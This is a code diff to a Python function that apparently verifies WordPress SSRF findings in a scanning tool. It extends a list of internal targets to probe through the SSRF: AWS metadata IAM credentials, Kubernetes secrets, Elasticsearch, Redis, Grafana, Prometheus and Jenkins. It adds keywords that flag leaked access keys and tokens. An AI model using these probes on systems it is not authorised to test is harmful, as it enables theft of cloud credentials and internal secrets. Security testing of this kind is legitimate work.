@@ -9488,19 +9488,32 @@ def verify_wordpress_ssrf(
             # --- Post-SSRF escalation: probe internal/cloud services ---
             try:
                 _ssrf_probe_targets = [
-                    # Cloud metadata
+                    # Cloud metadata — AWS, GCP, Azure
                     ("AWS_IMDS", "http://169.254.169.254/latest/meta-data/"),
+                    ("AWS_IMDS_credentials",
+                     "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
                     ("GCP_IMDS", "http://metadata.google.internal/computeMetadata/v1/instance/"),
-                    ("Azure_IMDS", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+                    ("Azure_IMDS",
+                     "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
                     # Docker daemon HTTP API (host-exposed, common misconfiguration)
                     ("Docker_API", "http://172.17.0.1:2375/version"),
                     ("Docker_API_local", "http://127.0.0.1:2375/version"),
                     # Kubernetes API (if in K8s cluster)
                     ("K8s_API", "http://kubernetes.default.svc/api/v1/namespaces"),
+                    ("K8s_API_secrets", "http://kubernetes.default.svc/api/v1/secrets"),
                     # Elasticsearch (commonly unauthenticated)
                     ("Elasticsearch", "http://127.0.0.1:9200/"),
+                    ("Elasticsearch_indices", "http://127.0.0.1:9200/_cat/indices"),
                     # Consul
                     ("Consul", "http://127.0.0.1:8500/v1/agent/self"),
+                    # Redis HTTP API (rarely exposed but present in some configs)
+                    ("Redis_info", "http://127.0.0.1:6379/"),
+                    # Grafana (common internal monitoring)
+                    ("Grafana", "http://127.0.0.1:3000/api/health"),
+                    # Prometheus
+                    ("Prometheus", "http://127.0.0.1:9090/api/v1/status/runtimeinfo"),
+                    # Jenkins
+                    ("Jenkins", "http://127.0.0.1:8080/api/json"),
                 ]
                 _ssrf_post_hits = []
                 for _svc_name, _svc_url in _ssrf_probe_targets:
@@ -9516,7 +9529,12 @@ def verify_wordpress_ssrf(
                         _meta_kws = ("ami-id", "instance-id", "meta-data", "computeMetadata",
                                      "subscriptionId", "accesskeyid", "secretaccesskey",
                                      "\"Version\":", "\"ApiVersion\":", "\"KubeletVersion\":",
-                                     "\"leader\":", "\"index\":", "\"cluster_name\":")
+                                     "\"leader\":", "\"index\":", "\"cluster_name\":",
+                                     "\"SecurityCredentials\"", "RoleArn", "Token", "Expiration",
+                                     "\"health\":", "\"status\":\"ok\"",
+                                     "\"runtimeInfo\"", "\"goroutineCount\"",
+                                     "\"numExecutors\"", "\"jobs\":",
+                                     "\"grafanaVersion\"")
                         if any(kw in _sbody for kw in _meta_kws):
                             _ssrf_post_hits.append({
                                 "service": _svc_name,
